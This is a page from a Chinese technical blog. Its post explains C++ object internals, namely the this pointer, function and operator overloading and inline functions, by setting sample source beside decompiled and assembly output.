<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">Cpp基础知识+底层逆向</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-20 12:46:37 / Modified: 16:09:14" itemprop="dateCreated datePublished" datetime="2023-11-20T12:46:37+08:00">2023-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>39k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>35 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="cpp-对象"><a href="#cpp-对象" class="headerlink" title="cpp 对象"></a>cpp 对象</h2><p>C++ 的每一个成员函数在 class 中声明，但是却不出现在每个对象中：</p>
<ul>
<li>每一个非内联的成员函数，只会诞生一个函数实例</li>
<li>每个内联函数，会在其每一个使用者身上产生一个函数实例</li>
</ul>
<p>C++ 的类就相当于一个数据结构体加上多个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class = data structure + code (methods)</span><br></pre></td></tr></table></figure>
<h2 id="This-指针"><a href="#This-指针" class="headerlink" title="This 指针"></a>This 指针</h2><p>This 指针就是指向实例对象自己的指针</p>
<p>案例一：This 的使用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name,<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;<span class="built_in">fun</span>(); <span class="comment">// 相当于fun</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;name,<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;<span class="built_in">fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">    B *b = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>();   </span><br><span class="line">    b-&gt;<span class="built_in">foo</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在调用类函数时，会将其 new 出来的堆内存当做第一个参数传入（相当于传入了该对象的数据结构体）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  A *v3; <span class="comment">// rax</span></span><br><span class="line">  B *v4; <span class="comment">// rax</span></span><br><span class="line">  A *a; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  B *b; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (A *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v3 = <span class="number">0LL</span>;</span><br><span class="line">  a = v3;</span><br><span class="line">  v4 = (B *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v4 = <span class="number">0LL</span>;</span><br><span class="line">  b = v4;</span><br><span class="line">  A::foo(a);</span><br><span class="line">  B::foo(b);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 This 指针，可以快速操控本实例对象的各个成员：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">A::foo</span><span class="params">(A *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_WORD *)<span class="keyword">this</span>-&gt;name = <span class="number">65</span>; <span class="comment">// 编译器优化了</span></span><br><span class="line">  Base::fun(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为：</p>
<ul>
<li>函数重载</li>
<li>运算符重载</li>
</ul>
<p>函数重载：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;int:&quot;</span>&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">double</span> f)</span> </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;double:&quot;</span>&lt;&lt;f&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test *t = <span class="keyword">new</span> Test;</span><br><span class="line">    t-&gt;<span class="built_in">print</span>(<span class="number">1</span>);</span><br><span class="line">    t-&gt;<span class="built_in">print</span>(<span class="number">1.1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于类函数来说，编译器会把 [类名称,函数名称,参数列表] 放入哈希函数转化为一个哈希值，并用这个哈希值来当做函数的名称：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; <span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> main</span></span><br><span class="line"><span class="function">main proc near</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">f</span>= qword ptr <span class="number">-18</span>h</span><br><span class="line">t= qword ptr <span class="number">-8</span></span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     edi, <span class="number">1</span>          ; <span class="keyword">unsigned</span> __int64</span><br><span class="line">call    __Znwm          ; <span class="function"><span class="keyword">operator</span> <span class="title">new</span><span class="params">(ulong)</span></span></span><br><span class="line"><span class="function">mov     [rbp+t], rax</span></span><br><span class="line"><span class="function">mov     rax, [rbp+t]</span></span><br><span class="line"><span class="function">mov     esi, 1          </span>; i</span><br><span class="line">mov     rdi, rax        ; <span class="keyword">this</span></span><br><span class="line">call    _ZN4Test5printEi ; Test::print(<span class="keyword">int</span>)</span><br><span class="line">mov     rdx, cs:qword_2018</span><br><span class="line">mov     rax, [rbp+t]</span><br><span class="line">mov     [rbp+f], rdx</span><br><span class="line">movsd   xmm0, [rbp+f]   ; f</span><br><span class="line">mov     rdi, rax        ; <span class="keyword">this</span></span><br><span class="line">call    _ZN4Test5printEd ; Test::print(<span class="keyword">double</span>)</span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; <span class="comment">// starts at 11BA</span></span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>
<ul>
<li>在汇编代码中，程序调用的函数已经确定</li>
<li>那么编译器可能是在语法分析时，就通过参数列表确定了应该调用的函数</li>
</ul>
<p>运算符重载（内部）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAll</span><span class="params">(<span class="keyword">double</span> len,<span class="keyword">double</span> bre,<span class="keyword">double</span> hei)</span></span>&#123;</span><br><span class="line">        length = len;</span><br><span class="line">        breadth = bre;</span><br><span class="line">        height = hei;</span><br><span class="line">    &#125;</span><br><span class="line">    Box <span class="keyword">operator</span> + (<span class="keyword">const</span> Box&amp; b)&#123; <span class="comment">/* 重载运算符&#x27;+&#x27;(只有&#x27;+&#x27;两边都是Box类型时,才会触发该函数) */</span></span><br><span class="line">        Box box;</span><br><span class="line">        box.length = <span class="keyword">this</span>-&gt;length + b.length;</span><br><span class="line">        box.breadth = <span class="keyword">this</span>-&gt;breadth + b.breadth;</span><br><span class="line">        box.height = <span class="keyword">this</span>-&gt;height + b.height;</span><br><span class="line">        <span class="keyword">return</span> box;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> length;      </span><br><span class="line">    <span class="keyword">double</span> breadth;     </span><br><span class="line">    <span class="keyword">double</span> height;      </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Box Box1;                </span><br><span class="line">    Box Box2;               </span><br><span class="line">    Box Box3;             </span><br><span class="line">    <span class="keyword">double</span> volume = <span class="number">0.0</span>;     </span><br><span class="line"></span><br><span class="line">    Box1.<span class="built_in">setAll</span>(<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>); </span><br><span class="line">    Box2.<span class="built_in">setAll</span>(<span class="number">2.0</span>,<span class="number">2.0</span>,<span class="number">2.0</span>); </span><br><span class="line"></span><br><span class="line">    volume = Box1.<span class="built_in">getVolume</span>();</span><br><span class="line">    volume = Box2.<span class="built_in">getVolume</span>();</span><br><span class="line">    Box3 = Box1 + Box2;</span><br><span class="line">    volume = Box3.<span class="built_in">getVolume</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在一个类中重载运算符过后，其作用范围为整个文件，以及引入该类的其他文件</li>
<li>本质上重载运算符就是调用对应的函数（其参数和返回值必须符合条件）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box1, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box2, <span class="number">2.0</span>, <span class="number">2.0</span>, <span class="number">2.0</span>);</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box1);</span><br><span class="line">volume = Box::<span class="built_in">getVolume</span>(&amp;Box2);</span><br><span class="line">Box::<span class="keyword">operator</span>+(&amp;v4, &amp;Box1, &amp;Box2);</span><br><span class="line">Box3 = v4;</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box3);</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box *__cdecl Box::<span class="keyword">operator</span>+(Box *retstr, Box *<span class="keyword">const</span> <span class="keyword">this</span>, <span class="keyword">const</span> Box *b)</span><br><span class="line">&#123;</span><br><span class="line">  retstr-&gt;length = b-&gt;length + <span class="keyword">this</span>-&gt;length;</span><br><span class="line">  retstr-&gt;breadth = b-&gt;breadth + <span class="keyword">this</span>-&gt;breadth;</span><br><span class="line">  retstr-&gt;height = b-&gt;height + <span class="keyword">this</span>-&gt;height;</span><br><span class="line">  <span class="keyword">return</span> retstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：Cpp 库中也有许多运算符重载的案例：<code>new</code>，<code>&lt;&lt;</code>，<code>&gt;&gt;</code> 等</li>
</ul>
<p>运算符重载（外部）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getVolume</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setAll</span><span class="params">(<span class="keyword">double</span> len,<span class="keyword">double</span> bre,<span class="keyword">double</span> hei)</span></span>&#123;</span><br><span class="line">        length = len;</span><br><span class="line">        breadth = bre;</span><br><span class="line">        height = hei;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> length;      </span><br><span class="line">    <span class="keyword">double</span> breadth;     </span><br><span class="line">    <span class="keyword">double</span> height;      </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Box <span class="keyword">operator</span> + (<span class="keyword">const</span> Box&amp; a,<span class="keyword">const</span> Box&amp; b)&#123; </span><br><span class="line">    Box box;</span><br><span class="line">    box.length = a.length + b.length;</span><br><span class="line">    box.breadth = a.breadth + b.breadth;</span><br><span class="line">    box.height = a.height + b.height;</span><br><span class="line">    <span class="keyword">return</span> box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Box Box1;                </span><br><span class="line">    Box Box2;               </span><br><span class="line">    Box Box3;             </span><br><span class="line">    <span class="keyword">double</span> volume = <span class="number">0.0</span>;     </span><br><span class="line"></span><br><span class="line">    Box1.<span class="built_in">setAll</span>(<span class="number">1.0</span>,<span class="number">1.0</span>,<span class="number">1.0</span>); </span><br><span class="line">    Box2.<span class="built_in">setAll</span>(<span class="number">2.0</span>,<span class="number">2.0</span>,<span class="number">2.0</span>); </span><br><span class="line"></span><br><span class="line">    volume = Box1.<span class="built_in">getVolume</span>();</span><br><span class="line">    volume = Box2.<span class="built_in">getVolume</span>();</span><br><span class="line">    Box3 = Box1 + Box2;</span><br><span class="line">    volume = Box3.<span class="built_in">getVolume</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在全局重载运算符过后，其作用范围就是全局（但可以被命名空间限制）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box1, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">Box::<span class="built_in">setAll</span>(&amp;Box2, <span class="number">2.0</span>, <span class="number">2.0</span>, <span class="number">2.0</span>);</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box1);</span><br><span class="line">volume = Box::<span class="built_in">getVolume</span>(&amp;Box2);</span><br><span class="line"><span class="keyword">operator</span>+(&amp;v4, &amp;Box1, &amp;Box2);</span><br><span class="line">Box3 = v4;</span><br><span class="line">Box::<span class="built_in">getVolume</span>(&amp;Box3);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Box *__cdecl <span class="keyword">operator</span>+(Box *retstr, <span class="keyword">const</span> Box *a, <span class="keyword">const</span> Box *b)</span><br><span class="line">&#123;</span><br><span class="line">  retstr-&gt;length = b-&gt;length + a-&gt;length;</span><br><span class="line">  retstr-&gt;breadth = b-&gt;breadth + a-&gt;breadth;</span><br><span class="line">  retstr-&gt;height = b-&gt;height + a-&gt;height;</span><br><span class="line">  <span class="keyword">return</span> retstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>在类的声明内部声明和定义的函数叫做内联成员函数</p>
<ul>
<li>内联函数类似于宏函数，但内联函数是在编译时展开，而宏在预编译时展开</li>
<li>内联函数的定义和使用必须在同一文件，因此最好将内联函数定义放在头文件中</li>
</ul>
<p>定义在类中的成员函数默认都是内联的，类外定义则要加上 inline（类的成员函数是指那些把定义和原型写在类定义内部的函数）</p>
